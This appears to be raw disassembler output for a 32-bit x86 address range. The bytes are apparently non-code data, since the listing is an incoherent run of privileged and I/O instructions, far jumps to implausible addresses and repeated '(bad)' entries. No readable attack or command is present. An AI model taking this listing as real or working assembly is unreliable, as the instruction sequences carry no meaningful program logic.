  404146:	shl    DWORD PTR [ebp+0x6933f68c],1
  40414c:	adc    esi,DWORD PTR [edi+ecx*2]
  40414f:	js     0x4040ed
  404151:	cmp    eax,ebx
  404153:	stc    
  404154:	sub    bl,BYTE PTR [edx-0x33]
  404157:	mov    edi,0x664ba94b
  40415c:	nop
  40415d:	dec    esp
  40415e:	das    
  40415f:	push   es
  404160:	cwde   
  404161:	jbe    0x4041ae
  404163:	mov    edx,0xe9ed11b0
  404168:	pop    esi
  404169:	adc    ecx,DWORD PTR [ecx]
  40416b:	out    dx,eax
  40416c:	lock sahf 
  40416e:	and    dl,BYTE PTR [ebx]
  404170:	mov    WORD PTR [ebx+0x53e5872c],gs
  404176:	mov    gs,WORD PTR [ecx-0xd158886]
  40417c:	push   0x5ac29df3
  404181:	cli    
  404182:	jo     0x4041be
  404184:	outs   dx,DWORD PTR ds:[esi]
  404185:	fist   DWORD PTR [edi-0x4716976a]
  40418b:	ins    BYTE PTR es:[edi],dx
  40418c:	nop
  40418d:	out    dx,al
  40418e:	addr16 popa 
  404190:	dec    edx
  404191:	inc    edx
  404192:	adc    bh,BYTE PTR [edx+0x17262d21]
  404198:	fstp   TBYTE PTR [edx]
  40419a:	into   
  40419b:	aad    0x2d
  40419d:	add    esi,DWORD PTR [edi-0x3b8338f2]
  4041a3:	icebp  
  4041a4:	sub    ch,BYTE PTR [edx+0x43]
  4041a7:	js     0x404192
  4041a9:	out    dx,al
  4041aa:	ror    edi,1
  4041ac:	cmp    al,0x41
  4041ae:	ds lahf 
  4041b0:	add    ah,cl
  4041b2:	fs scas al,BYTE PTR es:[edi]
  4041b4:	dec    ebx
  4041b5:	iret   
  4041b6:	fisttp QWORD PTR [eax+edi*2-0x6504948]
  4041bd:	or     al,0x98
  4041bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041c0:	jg     0x40415f
  4041c2:	into   
  4041c3:	das    
  4041c4:	pop    ss
  4041c5:	gs pop ecx
  4041c7:	pop    ds
  4041c8:	mov    ?,WORD PTR [edi+0x3c37260f]
  4041ce:	call   0x16527211
  4041d3:	jmp    0xec245b7d
  4041d8:	jmp    0x571b:0x3de4521a
  4041df:	or     BYTE PTR [esi+ecx*1+0xa39e0ff],dh
  4041e6:	xlat   BYTE PTR ds:[ebx]
  4041e7:	push   ss
  4041e8:	add    al,0xa9
  4041ea:	or     DWORD PTR [esi+0x1b58258b],edx
  4041f0:	daa    
  4041f1:	cdq    
  4041f2:	xor    esi,DWORD PTR [ebp-0xf6ca83d]
  4041f8:	popa   
  4041f9:	or     al,0x4a
  4041fb:	ss syscall 
  4041fe:	arpl   WORD PTR [ebx+0x36],si
  404201:	pop    ebp
  404202:	fcomp  DWORD PTR [ebx+esi*2+0x4e]
  404206:	int3   
  404207:	sub    esp,eax
  404209:	sti    
  40420a:	xor    BYTE PTR ds:0x2876af4d,dl
  404210:	mov    cl,BYTE PTR [eax-0x40]
  404213:	lea    ebp,[ecx-0x2b8288f0]
  404219:	(bad)  
  40421a:	xor    ebp,DWORD PTR [edx-0x576ecf53]
  404220:	add    bl,BYTE PTR [ecx]
  404222:	retf   
  404223:	inc    esp
  404224:	int    0x78
  404226:	mov    edi,0xe1d22c85
  40422b:	adc    eax,DWORD PTR ds:0x90592a9b
  404231:	pop    edi
  404232:	gs xchg esi,eax
  404234:	or     eax,0x5923ed3b
  404239:	sub    al,0xa4
  40423b:	mov    ds:0x3409f42a,al
  404240:	or     al,0x16
  404242:	adc    BYTE PTR [edx+esi*8],0x64
  404246:	mov    edx,0xc3f5f918
  40424b:	dec    edi
  40424c:	push   ebp
  40424d:	and    DWORD PTR [ebx+ebx*1],ebp
  404250:	ret    
  404251:	mov    ebx,0xbf078620
  404256:	shr    DWORD PTR [edx+ebp*4-0x71],1
  40425a:	stos   DWORD PTR es:[edi],eax
  40425b:	add    eax,0xbe277b58
  404260:	jge    0x404262
  404262:	or     ecx,edi
  404264:	xchg   ebp,eax
  404265:	pop    eax
  404266:	jo     0x4041fb
  404268:	mov    fs,WORD PTR [ebx+0x1c4189da]
  40426e:	aaa    
  40426f:	push   ecx
  404270:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404271:	in     eax,dx
  404272:	xchg   edi,eax
  404273:	sahf   
  404274:	loop   0x4041fd
  404276:	mov    edx,DWORD PTR [edx]
  404278:	scas   al,BYTE PTR es:[edi]
  404279:	sbb    DWORD PTR [eax+esi*1-0x4774e1fd],edx
  404280:	mov    eax,ds:0xf76ee0e4
  404285:	push   edx
  404286:	pop    eax
  404287:	xor    DWORD PTR [eax+0x5f65cc7d],0x6f
  40428e:	leave  
  40428f:	ds pusha 
  404291:	pop    ecx
  404292:	inc    ebp
  404293:	inc    esi
  404294:	pop    es
  404295:	or     eax,0xaa147f46
  40429a:	inc    ebp
  40429b:	xchg   esp,eax
  40429c:	dec    eax
  40429d:	rsm    
  40429f:	addr16 je 0x40427f
  4042a2:	mov    edx,0x82fd9b34
  4042a7:	pusha  
  4042a8:	das    
  4042a9:	jge    0x4042fa
  4042ab:	sub    eax,0xfc028afb
  4042b0:	or     ch,0x7e
  4042b3:	lahf   
  4042b4:	ficomp WORD PTR [ebx]
  4042b6:	sub    DWORD PTR [edx],ebp
  4042b8:	jmp    0x40fb:0xde746236
  4042bf:	mov    ebp,0x75463210
  4042c4:	lock je 0x404294
  4042c7:	imul   edx,DWORD PTR [ebp+0x226fd67a],0x2e
  4042ce:	mov    eax,0x2959620e
  4042d3:	pop    ds
  4042d4:	mov    edi,0xe1c41300
  4042d9:	jbe    0x40425f
  4042db:	outs   dx,BYTE PTR ds:[esi]
  4042dc:	icebp  
  4042dd:	and    esp,esp
  4042df:	xchg   esp,eax
  4042e0:	in     al,0xc1
  4042e2:	mov    BYTE PTR [edx+0x46],dl
  4042e5:	mov    cl,0xe7
  4042e7:	inc    ecx
  4042e8:	lods   al,BYTE PTR ds:[esi]
  4042e9:	std    
  4042ea:	sub    al,0x9b
  4042ec:	add    DWORD PTR [ebx-0x3c5bfaaa],0x1b
  4042f3:	mov    eax,ds:0xe5086e5e
  4042f8:	jl     0x40436f
  4042fa:	push   ebp
  4042fb:	mov    ebx,0xf4ccda96
  404300:	cld    
  404301:	and    eax,0xc52fa30f
  404306:	mov    esp,0x198e4811
  40430b:	dec    ecx
  40430c:	(bad)  
  40430d:	dec    esp
  40430e:	shl    DWORD PTR [esi+0x52],1
  404311:	sbb    cl,ah
  404313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404314:	repz ds jp 0x4042fa
  404318:	mov    esp,0xe70926d5
  40431d:	sbb    DWORD PTR [edx],esp
  40431f:	js     0x404354
  404321:	xor    ecx,esp
  404323:	mov    cl,0x47
  404325:	mov    ds:0xe2608755,eax
  40432a:	sar    BYTE PTR [ebx],cl
  40432c:	add    ch,BYTE PTR [ebp-0x4f]
  40432f:	sub    eax,0x1f00c2d3
  404334:	mul    ah
  404336:	jg     0x4042ed
  404338:	scas   al,BYTE PTR es:[edi]
  404339:	and    al,0x2a
  40433b:	mov    ah,0x87
  40433d:	push   0x51
  40433f:	mov    DWORD PTR [esi+esi*2],esi
  404342:	xchg   ecx,eax
  404343:	pop    ds
  404344:	add    cl,BYTE PTR [edi+0x2b]
  404347:	sbb    ch,BYTE PTR [ebp-0x29]
  40434a:	push   ebx
  40434b:	pop    ds
  40434c:	sbb    BYTE PTR [esi-0x3e2e6ece],bh
  404352:	sahf   
  404353:	push   eax
  404354:	push   cs
  404355:	and    DWORD PTR [esi-0x4e73d321],0xffffff8b
  40435c:	shr    DWORD PTR [ebx-0x61cb062f],1
  404362:	push   edx
  404363:	push   0x51b3c75d
  404368:	lea    esp,[esp+ebx*4+0x19]
  40436c:	es jmp 0x98d6d171
  404372:	ja     0x40436d
  404374:	repnz cmovb ecx,eax
  404378:	cli    
  404379:	mov    dh,0x53
  40437b:	mov    BYTE PTR [esi+0x23],ah
  40437e:	cld    
  40437f:	imul   edi,DWORD PTR [ecx-0x12],0x7a
  404383:	xchg   edi,eax
  404384:	in     al,dx
  404385:	lea    esp,[ebx]
  404387:	(bad)  
  404388:	mov    eax,0xb7d22c2e
  40438d:	sub    esp,DWORD PTR [ecx+0x6e29b2ec]
  404393:	mov    ebp,0x4ea6cabe
  404398:	xor    DWORD PTR [edi+eiz*8],eax
  40439b:	pop    esp
  40439c:	inc    eax
  40439d:	inc    eax
  40439e:	rcr    BYTE PTR [edi-0x66598e00],1
  4043a4:	mov    dh,0xdb
  4043a6:	mov    ah,0xb3
  4043a8:	enter  0x4364,0x95
  4043ac:	icebp  
  4043ad:	or     edi,DWORD PTR [edi+ebx*1+0x5f14eee4]
  4043b4:	mov    ch,0x2
  4043b6:	daa    
  4043b7:	test   DWORD PTR [eax+0x103eac3d],edi
  4043bd:	xlat   BYTE PTR ds:[ebx]
  4043be:	pop    ebx
  4043bf:	mov    esp,0x2acb1d08
  4043c4:	rol    BYTE PTR [ebx+0x48],0xe8
  4043c8:	arpl   WORD PTR [eax-0x36],si
  4043cb:	fs ins DWORD PTR es:[edi],dx
  4043cd:	out    dx,eax
  4043ce:	pop    ds
  4043cf:	add    al,0x7c
  4043d1:	pop    edx
  4043d2:	sbb    DWORD PTR [edx],esi
  4043d4:	sub    WORD PTR [edi-0x39d0ce5b],sp
  4043db:	push   ecx
  4043dc:	push   ss
  4043dd:	or     al,0x38
  4043df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043e0:	or     esp,ebp
  4043e2:	push   cs
  4043e3:	fsub   st(5),st
  4043e5:	jbe    0x4043f9
  4043e7:	push   es
  4043e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043e9:	fisubr WORD PTR [edi+0x57b71168]
  4043ef:	cwde   
  4043f0:	aas    
  4043f1:	fidivr DWORD PTR [ecx+eiz*1-0x3ace3da7]
  4043f8:	out    0xca,eax
  4043fa:	mov    esp,0xfb1a681
  4043ff:	cmp    BYTE PTR [edi+0x71],ch
  404402:	imul   ebx,DWORD PTR [ebx-0x800762f],0x5b3d37de
  40440c:	and    DWORD PTR [esp+esi*1-0x72],0xd5f638d5
  404414:	lods   eax,DWORD PTR ds:[esi]
  404415:	and    al,0x35
  404417:	lock icebp 
  404419:	sbb    dh,BYTE PTR [ecx+0x5328ae5]
  40441f:	in     al,dx
  404420:	mov    esi,0x3068406d
  404425:	clc    
  404426:	jbe    0x4043fb
  404428:	push   edx
  404429:	mov    edx,0x72cc987d
  40442e:	stos   BYTE PTR es:[edi],al
  40442f:	jns    0x404447
  404431:	cmp    DWORD PTR [esi],0x9141b8e3
  404437:	sbb    edx,DWORD PTR [ecx]
  404439:	mov    ds:0x9e36a2c6,al
  40443e:	and    ecx,edi
  404440:	xor    al,0x45
  404442:	inc    esp
  404443:	pop    edi
  404444:	push   ds
  404445:	imul   edi,DWORD PTR [edx],0xd4c042c3
  40444b:	and    BYTE PTR ds:0x70f0e002,ah
  404451:	adc    BYTE PTR [eax*1+0x1f3d60ac],dh
  404458:	add    edi,DWORD PTR [edx-0x6b]
  40445b:	xor    al,0x94
  40445d:	mov    cl,0xf6
  40445f:	sbb    al,0x58
  404461:	ret    0xeaf7
  404464:	push   ebp
  404465:	idiv   BYTE PTR [edx+esi*2+0x33]
  404469:	sahf   
  40446a:	mov    edi,0x17e58e55
  40446f:	lods   al,BYTE PTR ds:[esi]
  404470:	xlat   BYTE PTR ds:[ebx]
  404471:	ins    BYTE PTR es:[edi],dx
  404472:	sub    al,0x2d
  404474:	icebp  
  404475:	test   bl,0x89
  404478:	push   esp
  404479:	xchg   edi,eax
  40447a:	pop    eax
  40447b:	or     eax,0xc69a178c
  404480:	out    0xd4,eax
  404482:	dec    ecx
  404483:	(bad)
  404487:	scas   eax,DWORD PTR es:[edi]
  404488:	xor    ch,dh
  40448a:	mov    al,0x55
  40448c:	mov    eax,0x33fe27b6
  404491:	jne    0x404470
  404493:	aad    0xc2
  404495:	dec    eax
  404496:	fdivr  QWORD PTR ds:0xdd560de
  40449c:	add    ecx,esp
  40449e:	cmp    edx,DWORD PTR [esi-0x3a]
  4044a1:	retf   
  4044a2:	je     0x4044ac
  4044a4:	out    0x14,eax
  4044a6:	sub    ecx,ebx
  4044a8:	outs   dx,BYTE PTR ss:[esi]
  4044aa:	cld    
  4044ab:	adc    al,0x33
  4044ad:	rcl    BYTE PTR [esi-0x37828ad],0x98
  4044b4:	jns    0x404457
  4044b6:	cwde   
  4044b7:	aas    
  4044b8:	adc    ebp,edx
  4044ba:	sbb    BYTE PTR [ebp-0x50],0x26
  4044be:	sti    
  4044bf:	and    edi,ecx
  4044c1:	or     ch,BYTE PTR [edx-0x1416ac86]
  4044c7:	mov    edi,0x9c1cea82
  4044cc:	clc    
  4044cd:	aas    
  4044ce:	or     bl,BYTE PTR [edx]
  4044d0:	and    al,BYTE PTR ds:0xc5bc591c
  4044d6:	stc    
  4044d7:	pop    ss
  4044d8:	adc    ebx,esp
  4044da:	jl     0x4044e2
  4044dc:	(bad)  
  4044dd:	int3   
  4044de:	push   ebp
  4044df:	xlat   BYTE PTR ds:[ebx]
  4044e0:	daa    
  4044e1:	outs   dx,DWORD PTR ds:[esi]
  4044e2:	push   esp
  4044e3:	xor    al,0x87
  4044e5:	fldenv [ecx+ecx*4]
  4044e8:	xchg   ebp,eax
  4044e9:	push   ss
  4044ea:	retf   0x5706
  4044ed:	add    eax,0x123b6d53
  4044f2:	in     eax,dx
  4044f3:	add    al,0x4
  4044f5:	arpl   WORD PTR [eax],bp
  4044f7:	int    0x95
  4044f9:	inc    ebx
  4044fa:	push   ss
  4044fb:	add    ch,bh
  4044fd:	push   es
  4044fe:	into   
  4044ff:	out    0xe,eax
  404501:	pop    esi
  404502:	call   0xf6b145c8
  404507:	inc    ebx
  404508:	leave  
  404509:	(bad)  
  40450a:	repnz out dx,al
  40450c:	push   0x71614018
  404511:	and    al,0xcd
  404513:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404514:	pushf  
  404515:	je     0x4044d4
  404517:	mov    ah,0x9b
  404519:	aaa    
  40451a:	xchg   ebp,eax
  40451b:	ss aam 0x47
  40451e:	pop    ss
  40451f:	call   FWORD PTR [ebx-0x173f25cc]
  404525:	outs   dx,DWORD PTR ds:[esi]
  404526:	sbb    edx,DWORD PTR [ebx+0x48]
  404529:	jae    0x4044f7
  40452b:	in     al,dx
  40452c:	clc    
  40452d:	shl    DWORD PTR [eax-0x60],1
  404530:	pop    ds
  404531:	adc    bl,BYTE PTR [bp+si+0x526b]
  404536:	ds sub eax,0xe0efa1bd
  40453c:	mov    ebp,0xfc53869a
  404541:	clc    
  404542:	xchg   ebx,eax
  404543:	mov    eax,ds:0x2c58ab50
  404548:	(bad)  
  404549:	in     al,0x8a
  40454b:	(bad)  
  40454c:	arpl   dx,bp
  40454e:	out    0x35,al
  404550:	leave  
  404551:	outs   dx,DWORD PTR ds:[esi]
  404552:	pop    ss
  404553:	ficomp DWORD PTR [ebx+0x227cee56]
  404559:	stos   DWORD PTR es:[edi],eax
  40455a:	jne    0x4045ad
  40455c:	mov    eax,0xd4479b79
  404561:	addr16 cld 
  404563:	std    
  404564:	jg     0x404557
  404566:	jne    0x4045da
  404568:	das    
  404569:	mov    eax,0x976a9e3b
  40456e:	inc    ecx
  40456f:	dec    ebx
  404570:	in     ax,dx
  404572:	jmp    0x912c:0xa0ffd876
  404579:	mov    cl,BYTE PTR [ebx-0x53]
  40457c:	pop    edx
  40457d:	and    al,0x80
  40457f:	aam    0xd1
  404581:	mov    ch,0x73
  404583:	pop    ebx
  404584:	rcl    dh,0xc9
  404587:	aaa    
  404588:	scas   al,BYTE PTR es:[edi]
  404589:	mov    ds:0xe0d69ca5,al
  40458e:	xlat   BYTE PTR ds:[ebx]
  40458f:	inc    edi
  404590:	or     al,0xe4
  404592:	mov    edx,DWORD PTR [eax]
  404594:	push   ebp
  404595:	stos   BYTE PTR es:[edi],al
  404596:	jle    0x4045e1
  404598:	inc    edx
  404599:	dec    eax
  40459a:	pusha  
  40459b:	jno    0x404568
  40459d:	into   
  40459e:	jo     0x4045b0
  4045a0:	and    DWORD PTR [edi+0x47],ebp
  4045a3:	test   bl,0xc7
  4045a6:	dec    dh
  4045a8:	aam    0x2e
  4045aa:	add    esi,eax
  4045ac:	xlat   BYTE PTR ds:[ebx]
  4045ad:	mov    eax,ds:0x6ad7dc54
  4045b2:	push   edi
  4045b3:	pop    esi
  4045b4:	ins    DWORD PTR es:[edi],dx
  4045b5:	mov    cl,BYTE PTR [edx+0x37fa80b4]
  4045bb:	add    esi,DWORD PTR [ecx-0x51931e59]
  4045c1:	adc    ecx,DWORD PTR fs:[ebp-0x6267c86c]
  4045c8:	sbb    ch,ch
  4045ca:	fidivr WORD PTR [edx]
  4045cc:	jns    0x4045ec
  4045ce:	and    edx,ebx
  4045d0:	lahf   
  4045d1:	adc    DWORD PTR [ecx-0x49ac06de],ecx
  4045d7:	rol    eax,1
  4045d9:	fs scas al,BYTE PTR es:[edi]
  4045db:	pushf  
  4045dc:	pop    ebx
  4045dd:	pop    es
  4045de:	cmp    BYTE PTR [esi+0x4c],0xd5
  4045e2:	bound  esp,QWORD PTR [ebp-0x11]
  4045e5:	scas   eax,DWORD PTR es:[edi]
  4045e6:	fwait
  4045e7:	ds lahf 
  4045e9:	xchg   BYTE PTR [ebx+ebx*8+0x29],bh
  4045ed:	pop    ebx
  4045ee:	add    al,0xce
  4045f0:	in     eax,0x50
  4045f2:	or     eax,0x8906c1df
  4045f7:	push   esi
  4045f8:	adc    bh,BYTE PTR [ecx-0x22cecbbc]
  4045fe:	xchg   ecx,eax
  4045ff:	sub    BYTE PTR [ecx],0x32
  404602:	das    
  404603:	jns    0x4045f1
  404605:	mov    eax,ds:0xb8799054
  40460a:	(bad)  
  40460b:	cmp    esp,DWORD PTR [ebx]
  40460d:	add    DWORD PTR ds:0xea646558,eax
  404613:	loope  0x40462b
  404615:	xchg   ebx,eax
  404616:	fmulp  st(7),st
  404618:	adc    DWORD PTR [edx],0xd7db3724
  40461e:	mov    ah,0x3b
  404620:	xlat   BYTE PTR ds:[ebx]
  404621:	pop    ecx
  404622:	retf   
  404623:	pop    ebx
  404624:	mov    dl,0xc6
  404626:	jbe    0x404641
  404628:	je     0x4045f4
  40462a:	inc    edi
  40462b:	in     eax,dx
  40462c:	mov    eax,0x78b42b14
  404631:	not    BYTE PTR [esi]
  404633:	jns    0x404665
  404635:	xor    dh,BYTE PTR [eax]
  404637:	mov    dh,BYTE PTR [ecx+0x1]
  40463a:	jecxz  0x4046a8
  40463c:	retf   0xf39e
  40463f:	mov    bl,0x38
  404641:	dec    edx
  404642:	fsub   st,st(0)
  404644:	(bad)  
  404645:	ja     0x40463b
  404647:	sub    bh,bl
  404649:	lods   al,BYTE PTR ds:[esi]
  40464a:	enter  0x5039,0xb9
  40464e:	ins    DWORD PTR es:[edi],dx
  40464f:	adc    al,0xf0
  404651:	lahf   
  404652:	xchg   ebp,eax
  404653:	out    0x9e,al
  404655:	inc    ebx
  404656:	fiadd  WORD PTR [esp+eiz*8+0x742c1b81]
  40465d:	and    BYTE PTR [ebx-0x3b],0x50
  404661:	cmp    ch,BYTE PTR [ecx-0x80]
  404664:	sbb    al,0xf7
  404666:	fsub   st(3),st
  404668:	pop    esp
  404669:	iret   
  40466a:	clc    
  40466b:	xchg   esp,eax
  40466c:	xor    esi,esi
  40466e:	pop    edi
  40466f:	cmp    edi,DWORD PTR [edi]
  404671:	mov    cl,0x7b
  404673:	outs   dx,DWORD PTR ds:[esi]
  404675:	adc    al,0x5c
  404677:	das    
  404678:	repnz or al,0x16
  40467b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40467c:	sub    eax,DWORD PTR [esi-0xec2f5c1]
  404682:	popf   
  404683:	outs   dx,DWORD PTR ds:[esi]
  404684:	shl    DWORD PTR [edi],cl
  404686:	jo     0x404640
  404688:	popa   
  404689:	call   0x6265d021
  40468e:	lock jmp 0xf353ee50
  404694:	push   eax
  404695:	fnstenv [ebx+0x1c]
  404698:	sbb    edi,ecx
  40469a:	je     0x40467a
  40469c:	and    bx,WORD PTR [eax-0x7b]
  4046a0:	mov    edi,0x2049fb99
  4046a5:	lods   eax,DWORD PTR ds:[esi]
  4046a6:	add    BYTE PTR [ebx+0x6d329e47],cl
  4046ac:	enter  0x57ea,0x86
  4046b0:	gs push ebx
  4046b2:	mov    dx,0xa5c4
  4046b6:	sub    al,0xa2
  4046b8:	mov    ds:0xf50aea02,al
  4046bd:	adc    al,0xa6
  4046bf:	xchg   ecx,eax
  4046c0:	jecxz  0x404739
  4046c2:	pop    edi
  4046c3:	daa    
  4046c4:	test   BYTE PTR [ebp-0x6c],0x87
  4046c8:	popa   
  4046c9:	jno    0x404744
  4046cb:	sub    al,0x96
  4046cd:	aam    0xcd
  4046cf:	and    dh,dh
  4046d1:	adc    ecx,DWORD PTR [ecx-0x700fa337]
  4046d7:	and    al,BYTE PTR [ebp-0x6e8783ea]
  4046dd:	int3   
  4046de:	cli    
  4046df:	mov    dl,BYTE PTR [ecx+0xe]
  4046e2:	mov    ch,0x24
  4046e4:	aas    
  4046e5:	(bad)  
  4046e6:	mov    BYTE PTR [edi+0x5ffd947a],bh
  4046ec:	mov    al,ds:0x519f1c29
  4046f1:	sbb    ah,al
  4046f3:	rcr    edx,0x66
  4046f6:	jns    0x40467c
  4046f8:	adc    BYTE PTR [edi-0x67],bh
  4046fb:	or     bl,bh
  4046fd:	out    0x80,al
  4046ff:	add    al,BYTE PTR [ebx-0x45]
  404702:	nop
  404703:	inc    ebp
  404704:	bound  ebp,QWORD PTR [edx]
  404706:	lods   al,BYTE PTR ds:[esi]
  404707:	xchg   esi,eax
  404708:	cmp    eax,0xe934f6f6
  40470d:	pop    esi
  40470e:	loope  0x4046b0
  404710:	dec    edx
  404711:	dec    esi
  404712:	push   esp
  404713:	test   al,0x98
  404715:	enter  0x2f46,0xba
  404719:	sub    al,0x89
  40471b:	push   ebp
  40471c:	fistp  QWORD PTR [edx+0x5b2d9962]
  404722:	jb     0x40474f
  404724:	jmp    0xee69:0x83dba23e
  40472b:	or     eax,0xbbbb76ed
  404730:	outs   dx,DWORD PTR ds:[esi]
  404731:	jo     0x4046fe
  404733:	add    DWORD PTR [ecx],0xffffff81
  404736:	imul   ebp,DWORD PTR [ecx],0xffffff9b
  404739:	daa    
  40473a:	stos   BYTE PTR es:[edi],al
  40473b:	add    cl,BYTE PTR [edi-0x72]
  40473e:	push   ebp
  40473f:	ins    DWORD PTR es:[edi],dx
  404740:	mov    dl,0x5b
  404742:	mov    BYTE PTR [bp+di-0x2537],dl
  404747:	mov    WORD PTR [ebx+ebp*8-0xe],ds
  40474b:	jae    0x4047a0
  40474d:	pop    edx
  40474e:	jo     0x4046ef
  404750:	mov    dl,0xf8
  404752:	jnp    0x404766
  404754:	fcmovnbe st,st(4)
  404756:	jbe    0x404715
  404758:	pop    ebp
  404759:	fsqrt  
  40475b:	gs or  edi,ecx
  40475e:	sbb    eax,0x60292ceb
  404763:	test   al,0x4b
  404765:	lea    esi,[esi-0x3b]
  404768:	cld    
  404769:	mov    ebp,0xae2ca716
  40476e:	mov    gs,WORD PTR [esi]
  404770:	dec    edi
  404771:	pop    esi
  404772:	inc    edx
  404773:	mov    WORD PTR [eax-0x3a],fs
  404776:	and    ebx,DWORD PTR [eax]
  404778:	sti    
  404779:	mov    ds:0x9b9ca08e,eax
  40477e:	xor    bl,BYTE PTR [ebx+0x15]
  404781:	sub    ecx,DWORD PTR [edi-0x36ee98b3]
  404787:	out    dx,al
  404788:	clc    
  404789:	mov    edi,0xca83d235
  40478e:	test   al,0x88
  404790:	mov    cl,0xce
  404792:	lock push 0x78
  404795:	ror    BYTE PTR [esi-0xa],1
  404798:	out    0xcb,eax
  40479a:	xor    al,dh
  40479c:	mov    ch,0xa7
  40479e:	(bad)  
  40479f:	out    dx,eax
  4047a0:	fsub   DWORD PTR [esi+edx*4+0x14]
  4047a4:	aam    0x31
  4047a6:	sub    BYTE PTR [esi+0x232a599e],dl
  4047ac:	push   ebp
  4047ad:	stc    
  4047ae:	jo     0x4047e9
  4047b0:	sub    DWORD PTR [eax],edx
  4047b2:	repnz sahf 
  4047b4:	cdq    
  4047b5:	mov    bh,0x2a
  4047b7:	or     ch,BYTE PTR [ecx-0x317969e3]
  4047bd:	int3   
  4047be:	sbb    dl,dl
  4047c0:	add    al,0x71
  4047c2:	and    dh,dh
  4047c4:	ins    DWORD PTR es:[edi],dx
  4047c5:	mov    cl,0x48
  4047c7:	test   al,0xd8
  4047c9:	sub    eax,0x6b232cbf
  4047ce:	jmp    0x28cfa7f0
  4047d3:	lds    ecx,FWORD PTR [ecx+ecx*2]
  4047d6:	jmp    0x404857
  4047d8:	push   0xe4ef6933
  4047dd:	mov    ch,0xdb
  4047df:	mov    al,0x45
  4047e1:	cs sbb bl,dl
  4047e4:	cs dec edx
  4047e6:	xor    BYTE PTR [ecx],al
  4047e8:	bound  eax,QWORD PTR [ebp+edi*2+0x5c4a92fd]
  4047ef:	ret    0x3f5d
  4047f2:	mov    ebx,0x90ffdcae
  4047f7:	xchg   esi,eax
  4047f8:	mul    BYTE PTR [edx-0x6d]
  4047fb:	jg     0x40478b
  4047fd:	(bad)  
  4047ff:	test   eax,0x6cbd58ec
  404804:	pop    ebx
  404805:	push   0x7f
  404807:	mov    edi,0x75fe7242
  40480c:	and    al,0xca
  40480e:	xor    esi,DWORD PTR [edi+ebx*8-0x5e]
  404812:	jmp    0x40481e
  404814:	leave  
  404815:	push   eax
  404816:	mov    ss,WORD PTR [ebx]
  404818:	mov    esp,0x6b080d94
  40481d:	inc    esi
  40481e:	pop    eax
  40481f:	pop    es
  404820:	les    esp,FWORD PTR [ebp-0x23]
  404823:	push   es
  404824:	ss cwde 
  404826:	out    dx,al
  404827:	dec    ebx
  404828:	sahf   
  404829:	add    DWORD PTR [ebp+0x78],ecx
  40482c:	push   0xffffffe9
  40482e:	clc    
  40482f:	push   ds
  404830:	(bad)  
  404831:	sbb    ah,0xf5
  404834:	sar    al,cl
  404836:	inc    ecx
  404837:	jmp    0x404833
  404839:	fsub   QWORD PTR [edi-0x2b95356c]
  40483f:	adc    edx,DWORD PTR [eax]
  404841:	popa   
  404842:	mov    ebp,0x3192c2dd
  404847:	lds    esp,FWORD PTR [edi]
  404849:	dec    ecx
  40484a:	les    edi,FWORD PTR [esi+edi*4+0xcc3ae99]
  404851:	cmc    
  404852:	or     DWORD PTR [edx-0x7cc87b76],ebx
  404858:	ret    
  404859:	mov    bh,0x37
  40485b:	xlat   BYTE PTR ds:[ebx]
  40485c:	arpl   di,bp
  40485e:	rcr    BYTE PTR [edx+0x1ff05732],1
  404864:	xchg   BYTE PTR [edx],dl
  404866:	xor    DWORD PTR [eax],ebx
  404868:	mov    ebp,0xdd8a0006
  40486d:	jmp    FWORD PTR [esi-0x57]
  404870:	dec    eax
  404871:	and    DWORD PTR [esi+0x1e],0x27a3a40
  404878:	mov    eax,ds:0x1c5d1e1f
  40487d:	addr16 int3 
  40487f:	xor    BYTE PTR [ecx],dh
  404881:	lea    edx,[ecx+0x12]
  404884:	imul   esp,ebx,0x2674b653
  40488a:	and    al,0xda
  40488c:	push   ecx
  40488d:	cwde   
  40488e:	push   ds
  40488f:	aad    0x95
  404891:	sahf   
  404892:	scas   eax,DWORD PTR es:[edi]
  404893:	push   cs
  404894:	push   es
  404895:	ret    0x98e3
  404898:	fimul  DWORD PTR [esi]
  40489a:	mov    dh,0x5e
  40489c:	cmp    esp,DWORD PTR ds:0x8dd486b
  4048a2:	add    DWORD PTR [ebx-0x2f10f612],esi
  4048a8:	lods   eax,DWORD PTR ds:[esi]
  4048a9:	push   ebx
  4048aa:	cmp    DWORD PTR [ecx],eax
  4048ac:	retf   
  4048ad:	test   DWORD PTR [ebp-0x6f],edi
  4048b0:	rcr    DWORD PTR [eax],cl
  4048b2:	dec    ebx
  4048b3:	push   0x8e90e025
  4048b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048b9:	stc    
  4048ba:	fmul   QWORD PTR [ecx]
  4048bc:	dec    eax
  4048bd:	and    eax,0x5014e1fd
  4048c2:	jmp    FWORD PTR [eax]
  4048c4:	mov    dh,0xc0
  4048c6:	sbb    al,0x10
  4048c8:	jnp    0x404920
  4048ca:	pushf  
  4048cb:	jne    0x404870
  4048cd:	fist   DWORD PTR [edi]
  4048cf:	lods   eax,DWORD PTR ds:[esi]
  4048d0:	loopne 0x404878
  4048d2:	ror    DWORD PTR ds:0xbfc387db,1
  4048d8:	les    ebp,FWORD PTR [edi-0xf]
  4048db:	stos   DWORD PTR es:[edi],eax
  4048dc:	fcomp  st(0)
  4048de:	test   al,0x7d
  4048e0:	xchg   DWORD PTR [edx+0x69],eax
  4048e3:	bound  ebx,QWORD PTR [eax+0x76f75ca5]
  4048e9:	adc    ecx,DWORD PTR [ecx+ecx*8]
  4048ec:	xchg   esp,eax
  4048ed:	mov    esi,0xb62da8cb
  4048f2:	stos   BYTE PTR es:[edi],al
  4048f3:	or     ch,dh
  4048f5:	(bad)  
  4048f6:	and    al,0x71
  4048f8:	pop    esp
  4048f9:	jge    0x40496d
  4048fb:	lea    ecx,[ebp+0x12da2609]
  404901:	lahf   
  404902:	cmp    al,0xf
  404904:	and    edi,DWORD PTR [edx+0x72fde492]
  40490a:	sbb    edi,DWORD PTR [eax+0x6ab08ea1]
  404910:	rcr    DWORD PTR fs:[ebp-0x3942e5c4],cl
  404917:	mov    ebp,0xa946c6f6
  40491c:	xor    al,BYTE PTR [eax+0x6b99d643]
  404922:	jns    0x404924
  404924:	(bad)  
